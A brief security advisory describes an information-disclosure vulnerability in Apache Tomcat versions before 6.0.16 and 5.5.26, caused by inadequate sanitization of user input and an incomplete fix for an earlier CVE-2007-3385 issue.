Apache Tomcat is prone to an information-disclosure vulnerability because it fails to adequately sanitize user-supplied data.

Attackers can exploit this issue to access potentially sensitive data that may aid in further attacks.

Versions prior to Apache Tomcat 6.0.16 and 5.5.26 are vulnerable.

NOTE: This vulnerability is caused by an incomplete fix for BID 25316 - Apache Tomcat Multiple Remote Information Disclosure Vulnerabilities (CVE-2007-3385).
